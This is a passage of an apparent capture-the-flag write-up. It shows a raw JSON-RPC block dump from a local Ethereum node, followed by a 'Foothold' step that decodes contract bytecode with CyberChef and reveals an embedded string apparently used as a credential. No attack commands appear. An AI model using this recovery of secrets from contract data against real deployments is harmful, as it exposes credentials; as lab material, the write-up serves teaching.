< Server: Werkzeug/3.0.3 Python/3.12.3
< Date: Fri, 22 Nov 2024 18:32:24 GMT
< content-type: application/json
< Content-Length: 16665
< vary: origin, access-control-request-method, access-control-request-headers
< access-control-allow-origin: *
< date: Fri, 22 Nov 2024 18:32:24 GMT
< Connection: close
< 
{"jsonrpc":"2.0","id":1,"result":{"hash":"0x3b7177f9406efaa858f788fe22e5b7987090b0bd3129ca01fa100bdcfd4cac91","parentHash":"0x41665059a36a58495d5cd33cc49a299122e8068ce3ab31b2cb32f3cc13d99dc6","sha3Uncles":"0x1dcc4de8dec75d7aab85b567b6ccd41ad312451b948a7413f0a142fd40d49347","miner":"0x0000000000000000000000000000000000000000","stateRoot":"0x4e5be4b8af32f55975958bad3a6adeec8cc3e5aae4719b0bc501ee49f8d316a4","transactionsRoot":"0xde48ead1029fc7f8432f732a6adb528eafc73792654bf52942c32f71fbe8a487","receiptsRoot":"0x27a082523167b5bc47d38dd1c9421e79ba7fa2ba77615d4ceeec8bd5c61135ed","logsBloom":"0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000","difficulty":"0x0","number":"0x2","gasLimit":"0x1c9c380","gasUsed":"0x17eda8","timestamp":"0x6740c0ed","totalDifficulty":"0x0","extraData":"0x","mixHash":"0x0000000000000000000000000000000000000000000000000000000000000000","nonce":"0x0000000000000000","baseFeePerGas":"0x34c17bb6","blobGasUsed":"0x0","excessBlobGas":"0x0","uncles":[],"transactions":[{"hash":"0x263243bf28d7e82205008d1437d02289b148b6d64d528e25ee31bdbea45319d8","nonce":"0x1","blockHash":"0x3b7177f9406efaa858f788fe22e5b7987090b0bd3129ca01fa100bdcfd4cac91","blockNumber":"0x2","transactionIndex":"0x0","from":"0xb795dc8a5674250b602418e7f804cd162f03338b","to":null,"value":"0x0","gasPrice":"0x34c17bb6","gas":"0x17eda8","maxFeePerGas":"0x6982f76c","maxPriorityFeePerGas":"0x0","input":"0x60c060405234801561001057600080fd5b50604051611c51380380611c5183398101604081905261002f91610096565b336080526001600160a01b03811660a08190526040516362d378c560e11b815230600482015263c5a6f18a90602401600060405180830381600087803b15801561007857600080fd5b505af115801561008c573d6000803e3d6000fd5b50505050506100c6565b6000602082840312156100a857600080fd5b81516001600160a01b03811681146100bf57600080fd5b9392505050565b60805160a051611af661015b6000396000818161019a015281816102c5015281816105690152818161070001528181610aa001528181610cde01528181610f8301526113640152600081816102060152818161027b0152818161061d01528181610667015281816106bf01528181610a5f01528181610c9d01528181610f420152818161132301526114460152611af66000f3fe6080604052600436106100a05760003560e01c80635189875d116100645780635189875d14610168578063713b563f14610188578063804b644f146101d45780638da5cb5b146101f4578063a94c9b1814610228578063b8070c731461025657600080fd5b806315b25d30146100ac5780632686c3e8146100e45780633ccfd60b146101065780633f2f9f941461011b578063467fba0f1461014857600080fd5b366100a757005b600080fd5b3480156100b857600080fd5b506100cc6100c7366004611570565b61026b565b6040516100db93929190611602565b60405180910390f35b3480156100f057600080fd5b506101046100ff366004611638565b61055e565b005b34801561011257600080fd5b50610104610612565b34801561012757600080fd5b5061013b610136366004611570565b6106b2565b6040516100db919061167a565b34801561015457600080fd5b50610104610163366004611711565b610a54565b34801561017457600080fd5b5061013b610183366004611638565b610c90565b34801561019457600080fd5b506101bc7f000000000000000000000000000000000000000000000000000000000000000081565b6040516001600160a01b0390911681526020016100db565b3480156101e057600080fd5b5061013b6101ef366004611782565b610f35565b34801561020057600080fd5b506101bc7f000000000000000000000000000000000000000000000000000000000000000081565b34801561023457600080fd5b50610248610243366004611638565b611316565b6040519081526020016100db565b34801561026257600080fd5b50610248611439565b6060806000336001600160a01b037f000000000000000000000000000000000000000000000000000000000000000016146102c15760405162461bcd60e51b81526004016102b8906117d3565b60405180910390fd5b85857f00000000000000000000000000000000000000000000000000000000000000006001600160a01b03166336980d3a83836040518363ffffffff1660e01b815260040161031192919061183d565b602060405180830381865afa15801561032e573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906103529190611859565b61036e5760405162461bcd60e51b81526004016102b890611882565b600088886040516103809291906118af565b9081526020016040518091039020868154811061039f5761039f6118bf565b9060005260206000209060030201600001600089896040516103c29291906118af565b908152602001604051809103902087815481106103e1576103e16118bf565b906000526020600020906003020160010160008a8a6040516104049291906118af565b90815260200160405180910390208881548110610423576104236118bf565b906000526020600020906003020160020154828054610441906118d5565b80601f016020809104026020016040519081016040528092919081815260200182805461046d906118d5565b80156104ba5780601f1061048f576101008083540402835291602001916104ba565b820191906000526020600020905b81548152906001019060200180831161049d57829003601f168201915b505050505092508180546104cd906118d5565b80601f01602080910402602001604051908101604052809291908181526020018280546104f9906118d5565b80156105465780601f1061051b57610100808354040283529160200191610546565b820191906000526020600020905b81548152906001019060200180831161052957829003601f168201915b50505050509150945094509450505093509350939050565b336001600160a01b037f000000000000000000000000000000000000000000000000000000000000000016146105e25760405162461bcd60e51b8152602060048201526024808201527f4f6e6c792064617461626173652063616e2063616c6c20746869732066756e636044820152633a34b7b760e11b60648201526084016102b8565b600082826040516105f49291906118af565b9081526020016040518091039020600061060e919061148a565b5050565b336001600160a01b037f0000000000000000000000000000000000000000000000000000000000000000161461065a5760405162461bcd60e51b81526004016102b8906117d3565b6040516001600160a01b037f000000000000000000000000000000000000000000000000000000000000000016904780156108fc02916000818181858888f193505050501580156106af573d6000803e3d6000fd5b50565b6060336001600160a01b037f000000000000000000000000000000000000000000000000000000000000000016146106fc5760405162461bcd60e51b81526004016102b8906117d3565b83837f00000000000000000000000000000000000000000000000000000000000000006001600160a01b03166336980d3a83836040518363ffffffff1660e01b815260040161074c92919061183d565b602060405180830381865afa158015610769573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061078d9190611859565b6107a95760405162461bcd60e51b81526004016102b890611882565b600086866040516107bb9291906118af565b908152604051908190036020019020548411156107f757600086866040516107e49291906118af565b9081526040519081900360200190205493505b60008467ffffffffffffffff8111156108125761081261190f565b60405190808252806020026020018201604052801561086757816020015b61085460405180606001604052806060815260200160608152602001600081525090565b8152602001906001900390816108305790505b50905060005b85811015610a4957600088886040516108879291906118af565b9081526020016040518091039020818760008b8b6040516108a99291906118af565b908152604051908190036020019020546108c3919061193b565b6108cd9190611954565b815481106108dd576108dd6118bf565b9060005260206000209060030201604051806060016040529081600082018054610906906118d5565b80601f0160208091040260200160405190810160405280929190818152602001828054610932906118d5565b801561097f5780601f106109545761010080835404028352916020019161097f565b820191906000526020600020905b81548152906001019060200180831161096257829003601f168201915b50505050508152602001600182018054610998906118d5565b80601f01602080910402602001604051908101604052809291908181526020018280546109c4906118d5565b8015610a115780601f106109e657610100808354040283529160200191610a11565b820191906000526020600020905b8154815290600101906020018083116109f457829003601f168201915b50505050508152602001600282015481525050828281518110610a3657610a366118bf565b602090810291909101015260010161086d565b509695505050505050565b336001600160a01b037f00000000000000000000000000000000000000000000000000000000000000001614610a9c5760405162461bcd60e51b81526004016102b8906117d3565b83837f00000000000000000000000000000000000000000000000000000000000000006001600160a01b03166336980d3a83836040518363ffffffff1660e01b8152600401610aec92919061183d565b602060405180830381865afa158015610b09573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190610b2d9190611859565b610b495760405162461bcd60e51b81526004016102b890611882565b60008686604051610b5b9291906118af565b9081526020016040518091039020604051806060016040528086868080601f016020809104026020016040519081016040528093929190818152602001838380828437600092019190915250505090825250604080516020601f8b0181900481028201810190925289815291810191908a908a90819084018382808284376000920182905250938552505042602093840152508354600181018555938152208151919260030201908190610c0f90826119b6565b5060208201516001820190610c2490826119b6565b506040919091015160029091015560018054906000610c4283611a75565b9190505550426001547fa3dceacbd7fea253f50cea983bf77fbe5e9c416f5d9b805577dfe7c4d7988f8f88888888604051610c809493929190611a8e565b60405180910390a3505050505050565b6060336001600160a01b037f00000000000000000000000000000000000000000000000000000000000000001614610cda5760405162461bcd60e51b81526004016102b8906117d3565b82827f00000000000000000000000000000000000000000000000000000000000000006001600160a01b03166336980d3a83836040518363ffffffff1660e01b8152600401610d2a92919061183d565b602060405180830381865afa158015610d47573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190610d6b9190611859565b610d875760405162461bcd60e51b81526004016102b890611882565b60008585604051610d999291906118af565b9081526020016040518091039020805480602002602001604051908101604052809291908181526020016000905b82821015610f275783829060005260206000209060030201604051806060016040529081600082018054610dfa906118d5565b80601f0160208091040260200160405190810160405280929190818152602001828054610e26906118d5565b8015610e735780601f10610e4857610100808354040283529160200191610e73565b820191906000526020600020905b815481529060010190602001808311610e5657829003601f168201915b50505050508152602001600182018054610e8c906118d5565b80601f0160208091040260200160405190810160405280929190818152602001828054610eb8906118d5565b8015610f055780601f10610eda57610100808354040283529160200191610f05565b820191906000526020600020905b815481529060010190602001808311610ee857829003601f168201915b5050505050815260200160028201548152505081526020019060010190610dc7565b505050509250505092915050565b6060336001600160a01b037f00000000000000000000000000000000000000000000000000000000000000001614610f7f5760405162461bcd60e51b81526004016102b8906117d3565b84847f00000000000000000000000000000000000000000000000000000000000000006001600160a01b03166336980d3a83836040518363ffffffff1660e01b8152600401610fcf92919061183d565b602060405180830381865afa158015610fec573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906110109190611859565b61102c5760405162461bcd60e51b81526004016102b890611882565b83851061106b5760405162461bcd60e51b815260206004820152600d60248201526c496e76616c69642072616e676560981b60448201526064016102b8565b6000878760405161107d9291906118af565b908152604051908190036020019020548411156110dc5760405162461bcd60e51b815260206004820152601760248201527f456e6420696e646578206f7574206f6620626f756e647300000000000000000060448201526064016102b8565b60006110e8868661193b565b67ffffffffffffffff8111156111005761110061190f565b60405190808252806020026020018201604052801561115557816020015b61114260405180606001604052806060815260200160608152602001600081525090565b81526020019060019003908161111e5790505b509050855b8581101561130a57600089896040516111749291906118af565b90815260200160405180910390208181548110611193576111936118bf565b90600052602060002090600302016040518060600160405290816000820180546111bc906118d5565b80601f01602080910402602001604051908101604052809291908181526020018280546111e8906118d5565b80156112355780601f1061120a57610100808354040283529160200191611235565b820191906000526020600020905b81548152906001019060200180831161121857829003601f168201915b5050505050815260200160018201805461124e906118d5565b80601f016020809104026020016040519081016040528092919081815260200182805461127a906118d5565b80156112c75780601f1061129c576101008083540402835291602001916112c7565b820191906000526020600020905b8154815290600101906020018083116112aa57829003601f168201915b505050505081526020016002820154815250508288836112e7919061193b565b815181106112f7576112f76118bf565b602090810291909101015260010161115a565b50979650505050505050565b6000336001600160a01b037f000000000000000000000000000000000000000000000000000000000000000016146113605760405162461bcd60e51b81526004016102b8906117d3565b82827f00000000000000000000000000000000000000000000000000000000000000006001600160a01b03166336980d3a83836040518363ffffffff1660e01b81526004016113b092919061183d565b602060405180830381865afa1580156113cd573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906113f19190611859565b61140d5760405162461bcd60e51b81526004016102b890611882565b6000858560405161141f9291906118af565b908152604051908190036020019020549250505092915050565b6000336001600160a01b037f000000000000000000000000000000000000000000000000000000000000000016146114835760405162461bcd60e51b81526004016102b8906117d3565b5060015490565b50805460008255600302906000526020600020908101906106af91905b808211156114d95760006114bb82826114dd565b6114c96001830160006114dd565b50600060028201556003016114a7565b5090565b5080546114e9906118d5565b6000825580601f106114f9575050565b601f0160209004906000526020600020908101906106af91905b808211156114d95760008155600101611513565b60008083601f84011261153957600080fd5b50813567ffffffffffffffff81111561155157600080fd5b60208301915083602082850101111561156957600080fd5b9250929050565b60008060006040848603121561158557600080fd5b833567ffffffffffffffff81111561159c57600080fd5b6115a886828701611527565b909790965060209590950135949350505050565b6000815180845260005b818110156115e2576020818501810151868301820152016115c6565b506000602082860101526020601f19601f83011685010191505092915050565b60608152600061161560608301866115bc565b828103602084015261162781866115bc565b915050826040830152949350505050565b6000806020838503121561164b57600080fd5b823567ffffffffffffffff81111561166257600080fd5b61166e85828601611527565b90969095509350505050565b6000602082016020835280845180835260408501915060408160051b86010192506020860160005b8281101561170557603f1987860301845281518051606087526116c860608801826115bc565b9050602082015187820360208901526116e182826115bc565b604093840151989093019790975250945060209384019391909101906001016116a2565b50929695505050505050565b6000806000806040858703121561172757600080fd5b843567ffffffffffffffff81111561173e57600080fd5b61174a87828801611527565b909550935050602085013567ffffffffffffffff81111561176a57600080fd5b61177687828801611527565b95989497509550505050565b6000806000806060858703121561179857600080fd5b843567ffffffffffffffff8111156117af57600080fd5b6117bb87828801611527565b90989097506020870135966040013595509350505050565b60208082526021908201527f4f6e6c79206f776e65722063616e2063616c6c20746869732066756e6374696f6040820152603760f91b606082015260800190565b81835281816020850137506000828201602090810191909152601f909101601f19169091010190565b602081526000611851602083018486611814565b949350505050565b60006020828403121561186b57600080fd5b8151801515811461187b57600080fd5b9392505050565b602080825260139082015272155cd95c88191bd95cc81b9bdd08195e1a5cdd606a1b604082015260600190565b8183823760009101908152919050565b634e487b7160e01b600052603260045260246000fd5b600181811c908216806118e957607f821691505b60208210810361190957634e487b7160e01b600052602260045260246000fd5b50919050565b634e487b7160e01b600052604160045260246000fd5b634e487b7160e01b600052601160045260246000fd5b8181038181111561194e5761194e611925565b92915050565b8082018082111561194e5761194e611925565b601f8211156119b157806000526020600020601f840160051c8101602085101561198e5750805b601f840160051c820191505b818110156119ae576000815560010161199a565b50505b505050565b815167ffffffffffffffff8111156119d0576119d061190f565b6119e4816119de84546118d5565b84611967565b6020601f821160018114611a185760008315611a005750848201515b600019600385901b1c1916600184901b1784556119ae565b600084815260208120601f198516915b82811015611a485787850151825560209485019460019092019101611a28565b5084821015611a665786840151600019600387901b60f8161c191681555b50505050600190811b01905550565b600060018201611a8757611a87611925565b5060010190565b604081526000611aa2604083018688611814565b8281036020840152611ab5818587611814565b97965050505050505056fea26469706673582212208f54c018e408713008070bbc6ae8ea405e46ebf2f2bf42f49332bf33b210893d64736f6c634300081a0033000000000000000000000000* shutting down connection #0
75e41404c8c1de0c2ec801f06fbf5ace8662240f","r":"0x343e0f4e27960d9bb7f33900f5300301b6c1661af472c7d7f8da88ad1a6b1fda","s":"0x251a48bffdef7a666146dd62e3f7ca454f37d4905a04731b02b60ef4ce16062d","v":"0x0","yParity":"0x0","chainId":"0x7a69","accessList":[],"type":"0x2"}],"size":"0x1ed9"}}
```

The `structure` was very clear, it always started with the `Transaction`, followed by `Input`, which we focused on.

## Foothold

### Decode Blockchain Data

To `decrypt` the following data blob we used `CyberChef`.

```c
0x60a060405234801561001057600080fd5b5060405161184538038061184583398101604081905261002f9161039a565b60405180606001604052808281526020016040518060400160405280600581526020016430b236b4b760d91b8152508152602001600115158152506001604051610084906430b236b
<--- CUT FOR BREVITY --->
000000000000000000000000000000000000000000000000000000000000000056b65697261000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001a536f6d65646179426974436f696e57696c6c436f6c6c61707365000000000000
```

```
https://cyberchef.io/#recipe=From_Hex('Auto')&input=MHg2MGEwNjA0MDUyMzQ4MDE1NjEwMDEwNTc2MDAwODBmZDViNTA2MDQwNTE2MTE4NDUzODAzODA2MTE4NDU4MzM5ODEwMTYwNDA4MTkwNTI2MTAwMmY5MTYxMDM5YTU2NWI2MDQwNTE4MDYwNjAwMTYwNDA1MjgwODI4MTUyNjAyMDAxNjA0MDUxODA2MDQwMDE2MDQwNTI4MDYwMDU4MTUyNjAyMDAxNjQzMGIyMzZiNGI3NjBkOTFiODE1MjUwODE1MjYwMjAwMTYwMDExNTE1ODE1MjUwNjAwMTYwNDA1MTYxMDA4NDkwNjQzMGIyMzZiNGI3NjBkOTFiODE1MjYwMDUwMTkwNTY1YjkwODE1MjYwNDA1MTkwODE5MDAzNjAyMDAxOTAyMDgxNTE4MTkwNjEwMGExOTA4MjYxMDQ4YzU2NWI1MDYwMjA4MjAxNTE2MDAxODIwMTkwNjEwMGI2OTA4MjYxMDQ4YzU2NWI1MDYwNDA5MTkwOTEwMTUxNjAwMjkwOTEwMTgwNTQ2MGZmMTkxNjkxMTUxNTkxOTA5MTE3OTA1NTMzNjA4MDUyNjEwMGUwODI4MjYxMDBlNzU2NWI1MDUwNjEwNjBlNTY1YjYwODA1MTYwMDE2MDAxNjBhMDFiMDMxNjMzNjAwMTYwMDE2MGEwMWIwMzE2MTQ2MTAxNTk1NzYwNDA1MTYyNDYxYmNkNjBlNTFiODE1MjYwMjA2MDA0ODIwMTUyNjAyMTYwMjQ4MjAxNTI3ZjRmNmU2Yzc5MjA2Zjc3NmU2NTcyMjA2MzYxNmUyMDYzNjE2YzZjMjA3NDY4Njk3MzIwNjY3NTZlNjM3NDY5NmY2MDQ0ODIwMTUyNjAzNzYwZjkxYjYwNjQ4MjAxNTI2MDg0MDE1YjYwNDA1MTgwOTEwMzkwZmQ1YjYwNDA4MDUxNjAyMDgxMDE4MjUyNjAwMDkwNTI1MTdmYzVkMjQ2MDE4NmY3MjMzYzkyN2U3ZGIyZGNjNzAzYzBlNTAwYjY1M2NhODIyNzNiN2JmYWQ4MDQ1ZDg1YTQ3MDkwNjAwMTkwNjEwMTk4OTA4NTkwNjEwNTRhNTY1YjkwODE1MjYwNDA1MTkwODE5MDAzNjAyMDAxODEyMDYxMDFiMDkxNjEwNTY2NTY1YjYwNDA1MTgwOTEwMzkwMjAxNDYxMDIwNTU3NjA0MDUxNjI0NjFiY2Q2MGU1MWI4MTUyNjAyMDYwMDQ4MjAxNTI2MDE3NjAyNDgyMDE1MjdmNTU3MzY1NzI2ZTYxNmQ2NTIwNjE2YzcyNjU2MTY0NzkyMDY1Nzg2OTczNzQ3MzAwMDAwMDAwMDAwMDAwMDAwMDYwNDQ4MjAxNTI2MDY0MDE2MTAxNTA1NjViNjA0MDUxODA2MDYwMDE2MDQwNTI4MDgyODE1MjYwMjAwMTYwNDA1MTgwNjA0MDAxNjA0MDUyODA2MDA0ODE1MjYwMjAwMTYzM2FiOWIyYjk2MGUxMWI4MTUyNTA4MTUyNjAyMDAxNjAwMTE1MTU4MTUyNTA2MDAxODM2MDQwNTE2MTAyNGY5MTkwNjEwNTRhNTY1YjkwODE1MjYwNDA1MTkwODE5MDAzNjAyMDAxOTAyMDgxNTE4MTkwNjEwMjZjOTA4MjYxMDQ4YzU2NWI1MDYwMjA4MjAxNTE2MDAxODIwMTkwNjEwMjgxOTA4MjYxMDQ4YzU2NWI1MDYwNDA5MTgyMDE1MTYwMDI5MTkwOTEwMTgwNTQ2MGZmMTkxNjkxMTUxNTkxOTA5MTE3OTA1NTUxN2ZkYTRjZjdhMzg3YWRkODY1OWUxODY1YTJlMjU2MjRiYmFjZTI0ZGQ0YmMwMjkxOGU1NWYxNTBiMGU0NjBlZjk4OTA2MTAyY2I5MDg0OTA2MTA1ZGI1NjViNjA0MDUxODA5MTAzOTBhMTUwNTA1NjViNjM0ZTQ4N2I3MTYwZTAxYjYwMDA1MjYwNDE2MDA0NTI2MDI0NjAwMGZkNWI2MDAwNWI4MzgxMTAxNTYxMDMwODU3ODE4MTAxNTE4MzgyMDE1MjYwMjAwMTYxMDJmMDU2NWI1MDUwNjAwMDkxMDE1MjU2NWI2MDAwODI2MDFmODMwMTEyNjEwMzIyNTc2MDAwODBmZDViODE1MTYwMDE2MDAxNjA0MDFiMDM4MTExMTU2MTAzM2I1NzYxMDMzYjYxMDJkNzU2NWI2MDQwNTE2MDFmODIwMTYwMWYxOTkwODExNjYwM2YwMTE2ODEwMTYwMDE2MDAxNjA0MDFiMDM4MTExODI4MjEwMTcxNTYxMDM2OTU3NjEwMzY5NjEwMmQ3NTY1YjYwNDA1MjgxODE1MjgzODIwMTYwMjAwMTg1MTAxNTYxMDM4MTU3NjAwMDgwZmQ1YjYxMDM5MjgyNjAyMDgzMDE2MDIwODcwMTYxMDJlZDU2NWI5NDkzNTA1MDUwNTA1NjViNjAwMDgwNjA0MDgzODUwMzEyMTU2MTAzYWQ1NzYwMDA4MGZkNWI4MjUxNjAwMTYwMDE2MDQwMWIwMzgxMTExNTYxMDNjMzU3NjAwMDgwZmQ1YjYxMDNjZjg1ODI4NjAxNjEwMzExNTY1YjYwMjA4NTAxNTE5MDkzNTA5MDUwNjAwMTYwMDE2MDQwMWIwMzgxMTExNTYxMDNlZDU3NjAwMDgwZmQ1YjYxMDNmOTg1ODI4NjAxNjEwMzExNTY1YjkxNTA1MDkyNTA5MjkwNTA1NjViNjAwMTgxODExYzkwODIxNjgwNjEwNDE3NTc2MDdmODIxNjkxNTA1YjYwMjA4MjEwODEwMzYxMDQzNzU3NjM0ZTQ4N2I3MTYwZTAxYjYwMDA1MjYwMjI2MDA0NTI2MDI0NjAwMGZkNWI1MDkxOTA1MDU2NWI2MDFmODIxMTE1NjEwNDg3NTc4MDYwMDA1MjYwMjA2MDAwMjA2MDFmODQwMTYwMDUxYzgxMDE2MDIwODUxMDE1NjEwNDY0NTc1MDgwNWI2MDFmODQwMTYwMDUxYzgyMDE5MTUwNWI4MTgxMTAxNTYxMDQ4NDU3NjAwMDgxNTU2MDAxMDE2MTA0NzA1NjViNTA1MDViNTA1MDUwNTY1YjgxNTE2MDAxNjAwMTYwNDAxYjAzODExMTE1NjEwNGE1NTc2MTA0YTU2MTAyZDc1NjViNjEwNGI5ODE2MTA0YjM4NDU0NjEwNDAzNTY1Yjg0NjEwNDNkNTY1YjYwMjA2MDFmODIxMTYwMDE4MTE0NjEwNGVkNTc2MDAwODMxNTYxMDRkNTU3NTA4NDgyMDE1MTViNjAwMDE5NjAwMzg1OTAxYjFjMTkxNjYwMDE4NDkwMWIxNzg0NTU2MTA0ODQ1NjViNjAwMDg0ODE1MjYwMjA4MTIwNjAxZjE5ODUxNjkxNWI4MjgxMTAxNTYxMDUxZDU3ODc4NTAxNTE4MjU1NjAyMDk0ODUwMTk0NjAwMTkwOTIwMTkxMDE2MTA0ZmQ1NjViNTA4NDgyMTAxNTYxMDUzYjU3ODY4NDAxNTE2MDAwMTk2MDAzODc5MDFiNjBmODE2MWMxOTE2ODE1NTViNTA1MDUwNTA2MDAxOTA4MTFiMDE5MDU1NTA1NjViNjAwMDgyNTE2MTA1NWM4MTg0NjAyMDg3MDE2MTAyZWQ1NjViOTE5MDkxMDE5MjkxNTA1MDU2NWI2MDAwODA4MzU0NjEwNTc0ODE2MTA0MDM1NjViNjAwMTgyMTY4MDE1NjEwNThiNTc2MDAxODExNDYxMDVhMDU3NjEwNWQwNTY1YjYwZmYxOTgzMTY4NjUyODExNTE1ODIwMjg2MDE5MzUwNjEwNWQwNTY1Yjg2NjAwMDUyNjAyMDYwMDAyMDYwMDA1YjgzODExMDE1NjEwNWM4NTc4MTU0ODg4MjAxNTI2MDAxOTA5MTAxOTA2MDIwMDE2MTA1YWM1NjViNTA1MDgxODYwMTkzNTA1YjUwOTE5NTk0NTA1MDUwNTA1MDU2NWI2MDIwODE1MjYwMDA4MjUxODA2MDIwODQwMTUyNjEwNWZhODE2MDQwODUwMTYwMjA4NzAxNjEwMmVkNTY1YjYwMWYwMTYwMWYxOTE2OTE5MDkxMDE2MDQwMDE5MjkxNTA1MDU2NWI2MDgwNTE2MTEyMDA2MTA2NDU2MDAwMzk2MDAwODE4MTYxMDEzODAxNTI4MTgxNjEwMmVmMDE1MjgxODE2MTA1NWEwMTUyODE4MTYxMDc5MjAxNTI2MTA5MDYwMTUyNjExMjAwNjAwMGYzZmU2MDgwNjA0MDUyMzQ4MDE1NjEwMDEwNTc2MDAwODBmZDViNTA2MDA0MzYxMDYxMDA3ZDU3NjAwMDM1NjBlMDFjODA2MzUwN2I0ZTc5MTE2MTAwNWI1NzgwNjM1MDdiNGU3OTE0NjEwMGUxNTc4MDYzYzVhNmYxOGExNDYxMDBmNDU3ODA2M2Q1ZTM2M2Y5MTQ2MTAxMDc1NzgwNjNkZGM3YjZhNzE0NjEwMTFhNTc2MDAwODBmZDViODA2MzJjOGIwNzY2MTQ2MTAwODI1NzgwNjMzNjk4MGQzYTE0NjEwMDk3NTc4MDYzNDUxOGY2YjMxNDYxMDBiZjU3NWI2MDAwODBmZDViNjEwMDk1NjEwMDkwMzY2MDA0NjEwYjUzNTY1YjYxMDEyZDU2NWIwMDViNjEwMGFhNjEwMGE1MzY2MDA0NjEwYmMyNTY1YjYxMDJhZTU2NWI2MDQwNTE5MDE1MTU4MTUyNjAyMDAxNWI2MDQwNTE4MDkxMDM5MGYzNWI2MTAwZDI2MTAwY2QzNjYwMDQ2MTBiYzI1NjViNjEwMmUwNTY1YjYwNDA1MTYxMDBiNjkzOTI5MTkwNjEwYzUzNTY1YjYxMDA5NTYxMDBlZjM2NjAwNDYxMGM5NjU2NWI2MTA1NGY1NjViNjEwMDk1NjEwMTAyMzY2MDA0NjEwZDM5NTY1YjYxMDcwYzU2NWI2MTAwOTU2MTAxMTUzNjYwMDQ2MTBiYzI1NjViNjEwNzg3NTY1YjYxMDA5NTYxMDEyODM2NjAwNDYxMGUwYzU2NWI2MTA4ZmI1NjViMzM2MDAxNjAwMTYwYTAxYjAzN2YwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMTYxNDYxMDE3ZTU3NjA0MDUxNjI0NjFiY2Q2MGU1MWI4MTUyNjAwNDAxNjEwMTc1OTA2MTBlNzM1NjViNjA0MDUxODA5MTAzOTBmZDViODM4MzgwODA2MDFmMDE2MDIwODA5MTA0MDI2MDIwMDE2MDQwNTE5MDgxMDE2MDQwNTI4MDkzOTI5MTkwODE4MTUyNjAyMDAxODM4MzgwODI4NDM3NjAwMDkyMDE5MTkwOTE1MjUwNTA2MDQwNTE2MDAxOTI1MDYxMDFjNTkxNTA4MzkwNjEwZWI0NTY1YjkwODE1MjYwNDA1MTkwODE5MDAzNjAyMDAxOTAyMDYwMDIwMTU0NjBmZjE2NjEwMWY3NTc2MDQwNTE2MjQ2MWJjZDYwZTUxYjgxNTI2MDA0MDE2MTAxNzU5MDYxMGVkMDU2NWI2MDAxODU4NTYwNDA1MTYxMDIwOTkyOTE5MDYxMGVmZDU2NWI5MDgxNTI2MDQwNTE5MDgxOTAwMzYwMjAwMTkwMjA2MDAyMDE1NDYwZmYxNjYxMDIzYjU3NjA0MDUxNjI0NjFiY2Q2MGU1MWI4MTUyNjAwNDAxNjEwMTc1OTA2MTBlZDA1NjViODI4MjYwMDE4Nzg3NjA0MDUxNjEwMjRmOTI5MTkwNjEwZWZkNTY1YjkwODE1MjYwMjAwMTYwNDA1MTgwOTEwMzkwMjA2MDAxMDE5MTgyNjEwMjZkOTI5MTkwNjEwZjk2NTY1YjUwN2Y2NzU2MDE0M2FmN2FhMGRjMDNlMjcwYjIxYzIwNjdiYjZjZDhkZDNmNDEzYzg5NmQxOTk1OTA3MDhiNmU2MzY2ODU4NTYwNDA1MTYxMDI5ZjkyOTE5MDYxMTA1NTU2NWI2MDQwNTE4MDkxMDM5MGExNTA1MDUwNTA1MDU2NWI2MDAwNjAwMTgzODM2MDQwNTE2MTAyYzI5MjkxOTA2MTBlZmQ1NjViOTA4MTUyNjA0MDUxOTA4MTkwMDM2MDIwMDE5MDIwNjAwMjAxNTQ2MGZmMTY5MDUwOTI5MTUwNTA1NjViNjA2MDgwODAzMzYwMDE2MDAxNjBhMDFiMDM3ZjAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAxNjE0NjEwMzJjNTc2MDQwNTE2MjQ2MWJjZDYwZTUxYjgxNTI2MDA0MDE2MTAxNzU5MDYxMGU3MzU2NWI4NDg0ODA4MDYwMWYwMTYwMjA4MDkxMDQwMjYwMjAwMTYwNDA1MTkwODEwMTYwNDA1MjgwOTM5MjkxOTA4MTgxNTI2MDIwMDE4MzgzODA4Mjg0Mzc2MDAwOTIwMTkxOTA5MTUyNTA1MDYwNDA1MTYwMDE5MjUwNjEwMzczOTE1MDgzOTA2MTBlYjQ1NjViOTA4MTUyNjA0MDUxOTA4MTkwMDM2MDIwMDE5MDIwNjAwMjAxNTQ2MGZmMTY2MTAzYTU1NzYwNDA1MTYyNDYxYmNkNjBlNTFiODE1MjYwMDQwMTYxMDE3NTkwNjEwZWQwNTY1Yjg1ODU2MDAxODg4ODYwNDA1MTYxMDNiOTkyOTE5MDYxMGVmZDU2NWI5MDgxNTI2MDQwNTE5MDgxOTAwMzYwMjAwMTgxMjA5MDYwMDE5MDYxMDNkOTkwOGI5MDhiOTA2MTBlZmQ1NjViOTA4MTUyNjAyMDAxNjA0MDUxODA5MTAzOTAyMDYwMDEwMTgzODM4MDgwNjAxZjAxNjAyMDgwOTEwNDAyNjAyMDAxNjA0MDUxOTA4MTAxNjA0MDUyODA5MzkyOTE5MDgxODE1MjYwMjAwMTgzODM4MDgyODQzNzYwMDA5MjAxOTE5MDkxNTI1MDUwODQ1NDkyOTY1MDkzOTQ1MDkxOTI1MDgzOTE1MDYxMDQzNTkwNjEwZjBkNTY1YjgwNjAxZjAxNjAyMDgwOTEwNDAyNjAyMDAxNjA0MDUxOTA4MTAxNjA0MDUyODA5MjkxOTA4MTgxNTI2MDIwMDE4MjgwNTQ2MTA0NjE5MDYxMGYwZDU2NWI4MDE1NjEwNGFlNTc4MDYwMWYxMDYxMDQ4MzU3NjEwMTAwODA4MzU0MDQwMjgzNTI5MTYwMjAwMTkxNjEwNGFlNTY1YjgyMDE5MTkwNjAwMDUyNjAyMDYwMDAyMDkwNWI4MTU0ODE1MjkwNjAwMTAxOTA2MDIwMDE4MDgzMTE2MTA0